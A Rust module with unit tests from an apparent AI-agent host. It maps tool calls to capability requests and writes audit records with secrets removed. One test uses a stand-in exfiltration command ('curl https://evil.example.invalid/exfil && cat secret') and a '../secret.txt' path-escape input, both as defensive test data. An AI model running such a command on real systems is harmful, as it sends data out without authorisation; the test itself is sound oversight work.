//! Host-owned resource boundaries derived from tool calls.
//!
//! Phase 1 is observation only. A capability describes what a call *would*
//! need; it does not grant access, skip approval, or clear private-context
//! taint.
//!
//! Empty vectors mean "known to require nothing in that domain". Unknown
//! tools must use [`CapabilityRequest::unresolved_all`] instead of
//! [`CapabilityRequest::default`].

use std::collections::BTreeSet;
use std::path::{Path, PathBuf};

use serde_json::{Value, json};

/// Resource boundaries a tool call needs. Empty != unknown.
#[derive(Clone, Debug, Default, Eq, PartialEq)]
pub struct CapabilityRequest {
    pub filesystem: Vec<FilesystemCapability>,
    pub network: Vec<NetworkCapability>,
    pub browser: Vec<BrowserCapability>,
    pub system: Vec<SystemCapability>,
    pub process: Vec<ProcessCapability>,
    pub unresolved: BTreeSet<CapabilityDomain>,
}

#[derive(Clone, Copy, Debug, Eq, Hash, Ord, PartialEq, PartialOrd)]
pub enum CapabilityDomain {
    Filesystem,
    Network,
    Browser,
    System,
    Process,
}

#[derive(Clone, Debug, Eq, PartialEq)]
pub enum FilesystemCapability {
    ReadFile(PathBuf),
    ReadDirectory(PathBuf),
    WriteFile(PathBuf),
    CreateDirectory(PathBuf),
    /// Tree access is only for cases that genuinely need descendants.
    ReadTree(PathBuf),
    WriteTree(PathBuf),
}

#[derive(Clone, Copy, Debug, Eq, Hash, Ord, PartialEq, PartialOrd)]
pub enum NetworkScheme {
    Http,
    Https,
}

#[derive(Clone, Debug, Eq, Hash, Ord, PartialEq, PartialOrd)]
pub struct NetworkOrigin {
    pub scheme: NetworkScheme,
    pub host: String,
    pub port: Option<u16>,
}

#[derive(Clone, Debug, Eq, Hash, Ord, PartialEq, PartialOrd)]
pub enum NetworkCapability {
    Connect(NetworkOrigin),
}

#[derive(Clone, Debug, Eq, PartialEq)]
pub enum BrowserCapability {
    ListTabs,
    ReadSite { host: String },
    OperateSite { host: String },
    NavigateTo(NetworkOrigin),
    OpenExternalUrl(NetworkOrigin),
}

#[derive(Clone, Debug, Eq, PartialEq)]
pub enum SystemCapability {
    ScreenCapture { app: Option<String> },
    AccessibilityRead { app: Option<String> },
    AccessibilityWrite { app: Option<String> },
    InputEvents { app: Option<String> },
    AppList,
    AppLaunch { app: String },
    AppFocus { app: String },
    CalendarRead,
    CredentialUse { destination: Option<String> },
    KnowledgeRead,
    KnowledgeWrite,
}

#[derive(Clone, Debug, Eq, PartialEq)]
pub enum ProcessCapability {
    Shell { cwd: PathBuf },
}

impl CapabilityDomain {
    pub const ALL: [Self; 5] = [
        Self::Filesystem,
        Self::Network,
        Self::Browser,
        Self::System,
        Self::Process,
    ];

    pub fn as_str(self) -> &'static str {
        match self {
            Self::Filesystem => "filesystem",
            Self::Network => "network",
            Self::Browser => "browser",
            Self::System => "system",
            Self::Process => "process",
        }
    }
}

impl CapabilityRequest {
    /// Fail-closed: the host does not know what this call requires.
    pub fn unresolved_all() -> Self {
        Self {
            filesystem: Vec::new(),
            network: Vec::new(),
            browser: Vec::new(),
            system: Vec::new(),
            process: Vec::new(),
            unresolved: CapabilityDomain::ALL.into_iter().collect(),
        }
    }

    /// Known to require nothing. Do not use this for unknown tools.
    pub fn known_empty() -> Self {
        Self::default()
    }

    pub fn unresolved(domain: CapabilityDomain) -> Self {
        Self {
            unresolved: BTreeSet::from([domain]),
            ..Self::default()
        }
    }

    pub fn filesystem(capability: FilesystemCapability) -> Self {
        Self {
            filesystem: vec![capability],
            ..Self::default()
        }
    }

    pub fn network(capability: NetworkCapability) -> Self {
        Self {
            network: vec![capability],
            ..Self::default()
        }
    }

    pub fn browser(capability: BrowserCapability) -> Self {
        Self {
            browser: vec![capability],
            ..Self::default()
        }
    }

    pub fn system(capability: SystemCapability) -> Self {
        Self {
            system: vec![capability],
            ..Self::default()
        }
    }

    pub fn process(capability: ProcessCapability) -> Self {
        Self {
            process: vec![capability],
            ..Self::default()
        }
    }

    pub fn add_filesystem(mut self, capability: FilesystemCapability) -> Self {
        self.filesystem.push(capability);
        self
    }

    pub fn add_network(mut self, capability: NetworkCapability) -> Self {
        self.network.push(capability);
        self
    }

    pub fn add_system(mut self, capability: SystemCapability) -> Self {
        self.system.push(capability);
        self
    }

    pub fn add_unresolved(mut self, domain: CapabilityDomain) -> Self {
        self.unresolved.insert(domain);
        self
    }

    pub fn is_unresolved_all(&self) -> bool {
        self.filesystem.is_empty()
            && self.network.is_empty()
            && self.browser.is_empty()
            && self.system.is_empty()
            && self.process.is_empty()
            && CapabilityDomain::ALL
                .iter()
                .all(|domain| self.unresolved.contains(domain))
    }

    /// Structured audit record. Contains resource metadata only — never tool
    /// payloads, credentials, file contents, or typed text.
    pub fn audit_value(&self, tool: &str) -> Value {
        json!({
            "type": "capability_derived",
            "tool": tool,
            "filesystem": self.filesystem.iter().map(filesystem_audit).collect::<Vec<_>>(),
            "network": self.network.iter().map(network_audit).collect::<Vec<_>>(),
            "browser": self.browser.iter().map(browser_audit).collect::<Vec<_>>(),
            "system": self.system.iter().map(system_audit).collect::<Vec<_>>(),
            "process": self.process.iter().map(process_audit).collect::<Vec<_>>(),
            "unresolved": self.unresolved.iter().map(|domain| domain.as_str()).collect::<Vec<_>>(),
        })
    }
}

impl NetworkScheme {
    pub fn as_str(self) -> &'static str {
        match self {
            Self::Http => "http",
            Self::Https => "https",
        }
    }
}

/// Parse an http(s) origin. Userinfo and URL paths are dropped.
pub fn network_origin_from_url(raw: &str) -> Option<NetworkOrigin> {
    let url = reqwest::Url::parse(raw.trim()).ok()?;
    network_origin_from_parsed(&url)
}

pub fn network_origin_from_parsed(url: &reqwest::Url) -> Option<NetworkOrigin> {
    let scheme = match url.scheme() {
        "http" => NetworkScheme::Http,
        "https" => NetworkScheme::Https,
        _ => return None,
    };
    let host = url
        .host_str()?
        .trim()
        .trim_end_matches('.')
        .to_ascii_lowercase();
    if host.is_empty() {
        return None;
    }
    Some(NetworkOrigin {
        scheme,
        host,
        port: url.port(),
    })
}

pub fn connect_origins<I, S>(urls: I) -> Vec<NetworkCapability>
where
    I: IntoIterator<Item = S>,
    S: AsRef<str>,
{
    let mut seen = BTreeSet::new();
    let mut out = Vec::new();
    for url in urls {
        let Some(origin) = network_origin_from_url(url.as_ref()) else {
            continue;
        };
        if seen.insert(origin.clone()) {
            out.push(NetworkCapability::Connect(origin));
        }
    }
    out
}

fn path_display(path: &Path) -> String {
    path.display().to_string()
}

fn filesystem_audit(capability: &FilesystemCapability) -> Value {
    let (kind, path) = match capability {
        FilesystemCapability::ReadFile(path) => ("read_file", path),
        FilesystemCapability::ReadDirectory(path) => ("read_directory", path),
        FilesystemCapability::WriteFile(path) => ("write_file", path),
        FilesystemCapability::CreateDirectory(path) => ("create_directory", path),
        FilesystemCapability::ReadTree(path) => ("read_tree", path),
        FilesystemCapability::WriteTree(path) => ("write_tree", path),
    };
    json!({ "kind": kind, "path": path_display(path) })
}

fn network_audit(capability: &NetworkCapability) -> Value {
    match capability {
        NetworkCapability::Connect(origin) => origin_audit("connect", origin),
    }
}

fn origin_audit(kind: &str, origin: &NetworkOrigin) -> Value {
    json!({
        "kind": kind,
        "scheme": origin.scheme.as_str(),
        "host": origin.host,
        "port": origin.port,
    })
}

fn browser_audit(capability: &BrowserCapability) -> Value {
    match capability {
        BrowserCapability::ListTabs => json!({ "kind": "list_tabs" }),
        BrowserCapability::ReadSite { host } => json!({ "kind": "read_site", "host": host }),
        BrowserCapability::OperateSite { host } => json!({ "kind": "operate_site", "host": host }),
        BrowserCapability::NavigateTo(origin) => origin_audit("navigate_to", origin),
        BrowserCapability::OpenExternalUrl(origin) => origin_audit("open_external_url", origin),
    }
}

fn system_audit(capability: &SystemCapability) -> Value {
    match capability {
        SystemCapability::ScreenCapture { app } => json!({ "kind": "screen_capture", "app": app }),
        SystemCapability::AccessibilityRead { app } => {
            json!({ "kind": "accessibility_read", "app": app })
        }
        SystemCapability::AccessibilityWrite { app } => {
            json!({ "kind": "accessibility_write", "app": app })
        }
        SystemCapability::InputEvents { app } => json!({ "kind": "input_events", "app": app }),
        SystemCapability::AppList => json!({ "kind": "app_list" }),
        SystemCapability::AppLaunch { app } => json!({ "kind": "app_launch", "app": app }),
        SystemCapability::AppFocus { app } => json!({ "kind": "app_focus", "app": app }),
        SystemCapability::CalendarRead => json!({ "kind": "calendar_read" }),
        SystemCapability::CredentialUse { destination } => {
            json!({ "kind": "credential_use", "destination": destination })
        }
        SystemCapability::KnowledgeRead => json!({ "kind": "knowledge_read" }),
        SystemCapability::KnowledgeWrite => json!({ "kind": "knowledge_write" }),
    }
}

fn process_audit(capability: &ProcessCapability) -> Value {
    match capability {
        ProcessCapability::Shell { cwd } => json!({ "kind": "shell", "cwd": path_display(cwd) }),
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::computer::{
        AccessibilityBackend, AppBackend, InputBackend, Screenshot, ScreenshotBackend,
        computer_and_screenshot_registry_with_browser,
    };
    use crate::fs_tools::filesystem_registry;
    use crate::registry::ToolRegistry;
    use crate::scratch::ScratchSpace;
    use crate::shell::register_shell_tools;
    use crate::skill_types::SkillEndpoints;
    use crate::tool::{ToolContext, ToolError};
    use crate::web::register_web_tools;
    use serde_json::json;
    use std::fs;
    use std::os::unix::fs::symlink;
    use std::sync::Arc;
    use uuid::Uuid;

    fn temp_scratch() -> ScratchSpace {
        let root = std::env::temp_dir().join(format!("crosspond-cap-{}", Uuid::new_v4()));
        ScratchSpace::create(root).unwrap()
    }

    fn ctx(scratch: &ScratchSpace) -> ToolContext {
        ToolContext::with_scratch(scratch.clone())
    }

    fn fs_shell_web_registry() -> ToolRegistry {
        let mut registry = filesystem_registry();
        register_shell_tools(&mut registry);
        register_web_tools(&mut registry);
        registry
    }

    struct StubAx;
    impl AccessibilityBackend for StubAx {
        fn snapshot(&self, _: Option<i32>, _: Option<&str>) -> Result<String, ToolError> {
            Ok(String::new())
        }
        fn press(&self, _: &str) -> Result<String, ToolError> {
            Ok(String::new())
        }
        fn set_value(&self, _: &str, _: &str) -> Result<String, ToolError> {
            Ok(String::new())
        }
        fn describe_node(&self, _: &str) -> Option<String> {
            None
        }
    }

    struct StubApps;
    impl AppBackend for StubApps {
        fn list_apps(&self) -> Result<String, ToolError> {
            Ok(String::new())
        }
        fn open_app(&self, _: Option<&str>, _: Option<&str>) -> Result<String, ToolError> {
            Ok(String::new())
        }
        fn focus_app(&self, _: Option<&str>, _: Option<&str>) -> Result<String, ToolError> {
            Ok(String::new())
        }
        fn resolve_running_app(&self, app: &str) -> Result<(i32, String), ToolError> {
            Ok((1, app.to_string()))
        }
    }

    struct StubInput;
    impl InputBackend for StubInput {
        fn type_text(&self, _: &str, _: Option<&str>) -> Result<String, ToolError> {
            Ok(String::new())
        }
        fn hotkey(&self, _: &[String]) -> Result<String, ToolError> {
            Ok(String::new())
        }
        fn scroll(
            &self,
            _: &str,
            _: u32,
            _: &str,
            _: Option<&str>,
            _: Option<u32>,
            _: Option<u32>,
        ) -> Result<String, ToolError> {
            Ok(String::new())
        }
    }

    struct StubShot;
    impl ScreenshotBackend for StubShot {
        fn capture(&self, _: Option<i32>, _: Option<&str>) -> Result<Screenshot, ToolError> {
            Ok(Screenshot {
                bytes: Vec::new(),
                media_type: "image/png".into(),
                width: 1,
                height: 1,
                app_name: "Stub".into(),
            })
        }
        fn click(&self, _: u32, _: u32) -> Result<String, ToolError> {
            Ok(String::new())
        }
        fn recapture(&self) -> Result<Screenshot, ToolError> {
            self.capture(None, None)
        }
    }

    fn computer_registry() -> ToolRegistry {
        computer_and_screenshot_registry_with_browser(
            Arc::new(StubAx),
            Arc::new(StubShot),
            Arc::new(StubApps),
            Arc::new(StubInput),
            Arc::new(crate::calendar::MockCalendar),
            Arc::new(crate::browser::tests::MockBrowser::connected_page()),
        )
    }

    fn computer_registry_disconnected() -> ToolRegistry {
        computer_and_screenshot_registry_with_browser(
            Arc::new(StubAx),
            Arc::new(StubShot),
            Arc::new(StubApps),
            Arc::new(StubInput),
            Arc::new(crate::calendar::MockCalendar),
            Arc::new(crate::browser::DisconnectedBrowser),
        )
    }

    #[test]
    fn unknown_tool_is_unresolved_all_not_empty() {
        let registry = ToolRegistry::new();
        let request = registry.capability_request("future_exfil", &ToolContext::new(), &json!({}));
        assert!(request.is_unresolved_all());
        assert_ne!(request, CapabilityRequest::default());
        assert_ne!(request, CapabilityRequest::known_empty());
    }

    #[test]
    fn default_is_known_empty() {
        let empty = CapabilityRequest::default();
        assert!(empty.filesystem.is_empty());
        assert!(empty.unresolved.is_empty());
        assert!(!empty.is_unresolved_all());
    }

    #[test]
    fn origin_parser_drops_userinfo_and_default_ports() {
        let origin =
            network_origin_from_url("https://user:hunter2@api.example.com/path?q=secret").unwrap();
        assert_eq!(origin.scheme, NetworkScheme::Https);
        assert_eq!(origin.host, "api.example.com");
        assert_eq!(origin.port, None);
        let debug = format!("{origin:?}");
        assert!(!debug.contains("hunter2"));
        assert!(!debug.contains("secret"));
        let explicit = network_origin_from_url("http://Example.COM:8080/").unwrap();
        assert_eq!(explicit.host, "example.com");
        assert_eq!(explicit.port, Some(8080));
        assert!(network_origin_from_url("mailto:a@b.com").is_none());
        assert!(network_origin_from_url("file:///tmp/x").is_none());
    }

    #[test]
    fn read_file_derives_read_file() {
        let scratch = temp_scratch();
        let registry = filesystem_registry();
        let request = registry.capability_request(
            "read_file",
            &ctx(&scratch),
            &json!({"path": "output/hello.txt"}),
        );
        match &request.filesystem[..] {
            [FilesystemCapability::ReadFile(path)] => {
                assert!(path.ends_with("output/hello.txt"));
                assert!(path.starts_with(&scratch.root));
            }
            other => panic!("{other:?}"),
        }
        assert!(request.unresolved.is_empty());
        let _ = fs::remove_dir_all(&scratch.root);
    }

    #[test]
    fn list_directory_is_read_directory_not_tree() {
        let scratch = temp_scratch();
        let registry = filesystem_registry();
        let request = registry.capability_request("list_directory", &ctx(&scratch), &json!({}));
        assert!(matches!(
            request.filesystem.as_slice(),
            [FilesystemCapability::ReadDirectory(_)]
        ));
        assert!(
            !request
                .filesystem
                .iter()
                .any(|cap| matches!(cap, FilesystemCapability::ReadTree(_)))
        );
        let _ = fs::remove_dir_all(&scratch.root);
    }

    #[test]
    fn write_file_omits_content() {
        let scratch = temp_scratch();
        let registry = filesystem_registry();
        let secret = "SECRET_WRITE_PAYLOAD_hunter2";
        let request = registry.capability_request(
            "write_file",
            &ctx(&scratch),
            &json!({"path": "output/hello.txt", "content": secret}),
        );
        assert!(matches!(
            request.filesystem.as_slice(),
            [FilesystemCapability::WriteFile(_)]
        ));
        let audit = request.audit_value("write_file").to_string();
        assert!(!audit.contains(secret));
        assert!(!format!("{request:?}").contains(secret));
        let _ = fs::remove_dir_all(&scratch.root);
    }

    #[test]
    fn create_directory_derives_create() {
        let scratch = temp_scratch();
        let registry = filesystem_registry();
        let request = registry.capability_request(
            "create_directory",
            &ctx(&scratch),
            &json!({"path": "output/notes"}),
        );
        assert!(matches!(
            request.filesystem.as_slice(),
            [FilesystemCapability::CreateDirectory(_)]
        ));
        let _ = fs::remove_dir_all(&scratch.root);
    }

    #[test]
    fn parent_escape_resolves_outside_scratch() {
        let scratch = temp_scratch();
        let registry = filesystem_registry();
        let request = registry.capability_request(
            "read_file",
            &ctx(&scratch),
            &json!({"path": "../secret.txt"}),
        );
        match &request.filesystem[..] {
            [FilesystemCapability::ReadFile(path)] => {
                assert!(!path.starts_with(&scratch.root));
            }
            other => panic!("{other:?}"),
        }
        let _ = fs::remove_dir_all(&scratch.root);
    }

    #[test]
    fn symlink_escape_resolves_outside_scratch() {
        let scratch = temp_scratch();
        let outside = std::env::temp_dir().join(format!("crosspond-cap-out-{}", Uuid::new_v4()));
        fs::create_dir_all(&outside).unwrap();
        fs::write(outside.join("secret.txt"), "nope").unwrap();
        symlink(&outside, scratch.root.join("link")).unwrap();
        let registry = filesystem_registry();
        let request = registry.capability_request(
            "read_file",
            &ctx(&scratch),
            &json!({"path": "link/secret.txt"}),
        );
        match &request.filesystem[..] {
            [FilesystemCapability::ReadFile(path)] => {
                assert!(path.ends_with("secret.txt"));
                assert!(!path.starts_with(&scratch.root));
                assert!(path.starts_with(&outside));
            }
            other => panic!("{other:?}"),
        }
        let _ = fs::remove_dir_all(&scratch.root);
        let _ = fs::remove_dir_all(&outside);
    }

    #[test]
    fn unresolved_path_marks_filesystem() {
        let registry = filesystem_registry();
        let request = registry.capability_request(
            "read_file",
            &ToolContext::new(),
            &json!({"path": "relative.txt"}),
        );
        assert!(request.unresolved.contains(&CapabilityDomain::Filesystem));
        assert!(request.filesystem.is_empty());
    }

    #[test]
    fn run_command_scratch_shell_leaves_domains_unresolved() {
        let scratch = temp_scratch();
        let mut registry = ToolRegistry::new();
        register_shell_tools(&mut registry);
        let command = "curl https://evil.example.invalid/exfil && cat secret";
        let request = registry.capability_request(
            "run_command",
            &ctx(&scratch),
            &json!({"command": command}),
        );
        assert!(matches!(
            request.process.as_slice(),
            [ProcessCapability::Shell { cwd }] if cwd == &scratch.root
        ));
        assert!(request.filesystem.iter().any(
            |cap| matches!(cap, FilesystemCapability::ReadTree(path) if path == &scratch.root)
        ));
        assert!(request.filesystem.iter().any(
            |cap| matches!(cap, FilesystemCapability::WriteTree(path) if path == &scratch.root)
        ));
        assert!(request.unresolved.contains(&CapabilityDomain::Filesystem));
        assert!(request.unresolved.contains(&CapabilityDomain::Network));
        assert!(request.unresolved.contains(&CapabilityDomain::System));
        assert!(!request.unresolved.contains(&CapabilityDomain::Process));
        let audit = request.audit_value("run_command").to_string();
        assert!(!audit.contains(command));
        assert!(!audit.contains("evil.example.invalid"));
        assert!(!format!("{request:?}").contains(command));
        assert!(!format!("{request:?}").contains("FullAccess"));
        let _ = fs::remove_dir_all(&scratch.root);
    }

    #[test]
    fn run_command_without_scratch_is_unresolved() {
        let mut registry = ToolRegistry::new();
        register_shell_tools(&mut registry);
        let request = registry.capability_request(
            "run_command",
            &ToolContext::new(),
            &json!({"command": "pwd"}),
        );
        assert!(request.unresolved.contains(&CapabilityDomain::Process));
        assert!(request.unresolved.contains(&CapabilityDomain::Filesystem));
        assert!(request.unresolved.contains(&CapabilityDomain::Network));
        assert!(request.unresolved.contains(&CapabilityDomain::System));
        assert!(request.process.is_empty());
    }

    #[test]
    fn open_url_http_is_external_browser_origin() {
        let mut registry = ToolRegistry::new();
        register_shell_tools(&mut registry);
        let request = registry.capability_request(
            "open_url",
            &ToolContext::new(),
            &json!({"url": "https://example.com/path"}),
        );
        match &request.browser[..] {
            [BrowserCapability::OpenExternalUrl(origin)] => {
                assert_eq!(origin.host, "example.com");
                assert_eq!(origin.scheme, NetworkScheme::Https);
            }
            other => panic!("{other:?}"),
        }
        assert!(request.unresolved.is_empty());
        let mailto = registry.capability_request(
            "open_url",
            &ToolContext::new(),
            &json!({"url": "mailto:a@b.com"}),
        );
        assert!(mailto.unresolved.contains(&CapabilityDomain::Browser));
        assert!(mailto.browser.is_empty());
    }

    #[test]
    fn fetch_url_derives_origin_and_optional_credential() {
        let registry = fs_shell_web_registry();
        let request = registry.capability_request(
            "fetch_url",
            &ToolContext::new(),
            &json!({"url": "https://api.example.com/v1"}),
        );
        assert_eq!(
            request.network,
            vec![NetworkCapability::Connect(NetworkOrigin {
                scheme: NetworkScheme::Https,
                host: "api.example.com".into(),
                port: None,
            })]
        );
        assert!(request.system.is_empty());

        let mut context = ToolContext::new();
        context.credential_destination = Some("files.example.invalid".into());
        context.fill_username = Some("ngc".into());
        context.fill_password = Some("hunter2".into());
        let authed = registry.capability_request(
            "fetch_url",
            &context,
            &json!({
                "url": "https://files.example.invalid/inner/",
                "credential_ref": "lab"
            }),
        );
        assert!(authed.system.iter().any(|cap| matches!(
            cap,
            SystemCapability::CredentialUse {
                destination: Some(dest)
            } if dest == "files.example.invalid"
        )));
        let audit = authed.audit_value("fetch_url").to_string();
        assert!(!audit.contains("hunter2"));
        assert!(!audit.contains("ngc"));
        assert!(!format!("{authed:?}").contains("hunter2"));
    }

    #[test]
    fn web_search_uses_exa_origin_without_query() {
        let registry = fs_shell_web_registry();
        let query = "classified lab protocol 7";
        let request = registry.capability_request(
            "web_search",
            &ToolContext::new(),
            &json!({"query": query}),
        );
        assert!(request.network.iter().any(|cap| matches!(
            cap,
            NetworkCapability::Connect(origin) if origin.host == "api.exa.ai"
        )));
        let audit = request.audit_value("web_search").to_string();
        assert!(!audit.contains(query));
    }

    #[test]
    fn knowledge_tools_split_read_and_write() {
        let registry = filesystem_registry();
        for tool in [
            "knowledge_search",
            "knowledge_read",
            "knowledge_neighbors",
            "knowledge_backlinks",
            "knowledge_find_procedure",
        ] {
            let request = registry.capability_request(tool, &ToolContext::new(), &json!({}));
            assert_eq!(
                request.system,
                vec![SystemCapability::KnowledgeRead],
                "{tool}"
            );
        }
        for tool in [
            "knowledge_ingest",
            "knowledge_propose_update",
            "knowledge_read_later",
            "knowledge_archive_source",
        ] {
            let request = registry.capability_request(tool, &ToolContext::new(), &json!({}));
            assert_eq!(
                request.system,
                vec![SystemCapability::KnowledgeWrite],
                "{tool}"
            );
        }
    }

    #[test]
    fn skill_read_uses_host_path_without_body() {
        let root = std::env::temp_dir().join(format!("crosspond-cap-skills-{}", Uuid::new_v4()));
        let skill = root.join("pdf-processing");
        fs::create_dir_all(&skill).unwrap();
        fs::write(
            skill.join("SKILL.md"),
            "---\nname: pdf-processing\ndescription: demo\n---\n# secret skill body\n",
        )
        .unwrap();
        let mut context = ToolContext::new();
        context.skills_root = Some(root.clone());
        context.global_skills_root = Some(root.join("missing-global"));
        let registry = filesystem_registry();
        let request =
            registry.capability_request("skill_read", &context, &json!({"name": "pdf-processing"}));
        assert!(
            request
                .filesystem
                .iter()
                .any(|cap| matches!(cap, FilesystemCapability::ReadTree(path) if path == &skill))
        );
        let audit = request.audit_value("skill_read").to_string();
        assert!(!audit.contains("secret skill body"));
        let _ = fs::remove_dir_all(&root);
    }

    #[test]
    fn skill_search_and_install_use_endpoint_origins_without_http() {
        let root = std::env::temp_dir().join(format!("crosspond-cap-install-{}", Uuid::new_v4()));
        let mut context = ToolContext::new();
        context.skills_root = Some(root.clone());
        context.skill_endpoints = Some(SkillEndpoints::for_local_mock(
            "http://127.0.0.1:1/crosspond-cap-mock",
        ));
        let registry = filesystem_registry();
        let started = std::time::Instant::now();
        let search = registry.capability_request(
            "skill_search",
            &context,
            &json!({"query": "pdf processing"}),
        );
        let install = registry.capability_request(
            "skill_install",
            &context,
            &json!({"source": "acme/skills", "name": "pdf-processing"}),
        );
        assert!(started.elapsed() < std::time::Duration::from_millis(200));
        assert!(search.network.iter().any(|cap| matches!(
            cap,
            NetworkCapability::Connect(origin) if origin.host == "127.0.0.1"
        )));
        assert!(
            !search
                .audit_value("skill_search")
                .to_string()
                .contains("pdf processing")
        );
        assert!(install.network.iter().any(|cap| matches!(
            cap,
            NetworkCapability::Connect(origin) if origin.host == "127.0.0.1"
        )));
        assert!(install.filesystem.iter().any(|cap| matches!(
            cap,
            FilesystemCapability::WriteTree(path) if path.starts_with(&root)
        )));
        let _ = fs::remove_dir_all(&root);
    }

    #[test]
    fn browser_tabs_list_and_missing_host_is_unresolved() {
        let connected = computer_registry();
        let tabs = connected.capability_request("browser_tabs", &ToolContext::new(), &json!({}));
        assert_eq!(tabs.browser, vec![BrowserCapability::ListTabs]);
        let snap =
            connected.capability_request("browser_snapshot", &ToolContext::new(), &json!({}));
        assert!(matches!(
            snap.browser.as_slice(),
            [BrowserCapability::ReadSite { host }] if host == "example.com"
        ));
        let fill = connected.capability_request(
            "browser_fill",
            &ToolContext::new(),
            &json!({"ref": "a1f3-e1", "text": "typed-secret-value"}),
        );
        assert!(matches!(
            fill.browser.as_slice(),
            [BrowserCapability::OperateSite { host }] if host == "example.com"
        ));
        assert!(
            !fill
                .audit_value("browser_fill")
                .to_string()
                .contains("typed-secret-value")
        );

        let disconnected = computer_registry_disconnected();
        let missing =
            disconnected.capability_request("browser_text", &ToolContext::new(), &json!({}));
        assert!(missing.unresolved.contains(&CapabilityDomain::Browser));
        assert!(missing.browser.is_empty());
        assert!(!missing.is_unresolved_all());
    }

    #[test]
    fn browser_navigate_uses_destination_origin() {
        let registry = computer_registry();
        let request = registry.capability_request(
            "browser_navigate",
            &ToolContext::new(),
            &json!({"action": "goto", "url": "https://notes.example.com/a"}),
        );
        match &request.browser[..] {
            [BrowserCapability::NavigateTo(origin)] => {
                assert_eq!(origin.host, "notes.example.com");
            }
            other => panic!("{other:?}"),
        }
        let new_tab = registry.capability_request(
            "browser_new_tab",
            &ToolContext::new(),
            &json!({"url": "https://notes.example.com/"}),
        );
        assert!(matches!(
            new_tab.browser.as_slice(),
            [BrowserCapability::NavigateTo(origin)] if origin.host == "notes.example.com"
        ));
    }

    #[test]
    fn computer_tools_exclude_typed_values() {
        let registry = computer_registry();
        let mut context = ToolContext::new();
        context.frontmost_name = Some("Safari".into());
        let shot = registry.capability_request("take_screenshot", &context, &json!({}));
        assert!(matches!(
            shot.system.as_slice(),
            [SystemCapability::ScreenCapture { app: Some(app) }] if app == "Safari"
        ));
        let ax = registry.capability_request("get_accessibility_snapshot", &context, &json!({}));
        assert!(matches!(
            ax.system.as_slice(),
            [SystemCapability::AccessibilityRead { app: Some(app) }] if app == "Safari"
        ));
        let typed =
            registry.capability_request("ui_type", &context, &json!({"text": "typed-ui-secret"}));
        assert!(matches!(
            typed.system.as_slice(),
            [SystemCapability::InputEvents { app: Some(app) }] if app == "Safari"
        ));
        assert!(
            !typed
                .audit_value("ui_type")
                .to_string()
                .contains("typed-ui-secret")
        );
        let press = registry.capability_request("ui_press", &context, &json!({"node_id": 4}));
        assert!(matches!(
            press.system.as_slice(),
            [SystemCapability::AccessibilityWrite { app: Some(app) }] if app == "Safari"
        ));
        let click = registry.capability_request("ui_click", &context, &json!({"x": 10, "y": 10}));
        assert!(matches!(
            click.system.as_slice(),
            [SystemCapability::InputEvents { .. }]
        ));
        context.credential_destination = Some("vpn.example".into());
        context.fill_username = Some("labuser".into());
        context.fill_password = Some("hunter2".into());
        let fill = registry.capability_request(
            "fill_credential",
            &context,
            &json!({"credential_ref": "lab"}),
        );
        assert_eq!(
            fill.system,
            vec![SystemCapability::CredentialUse {
                destination: Some("vpn.example".into())
            }]
        );
        let audit = fill.audit_value("fill_credential").to_string();
        assert!(!audit.contains("hunter2"));
        assert!(!audit.contains("labuser"));
        assert_eq!(
            registry
                .capability_request("list_apps", &context, &json!({}))
                .system,
            vec![SystemCapability::AppList]
        );
        assert!(matches!(
            registry
                .capability_request("open_app", &context, &json!({"name": "Notes"}))
                .system
                .as_slice(),
            [SystemCapability::AppLaunch { app }] if app == "Notes"
        ));
        assert!(matches!(
            registry
                .capability_request("focus_app", &context, &json!({"name": "Notes"}))
                .system
                .as_slice(),
            [SystemCapability::AppFocus { app }] if app == "Notes"
        ));
        assert_eq!(
            registry
                .capability_request("calendar_events", &context, &json!({}))
                .system,
            vec![SystemCapability::CalendarRead]
        );
    }
}
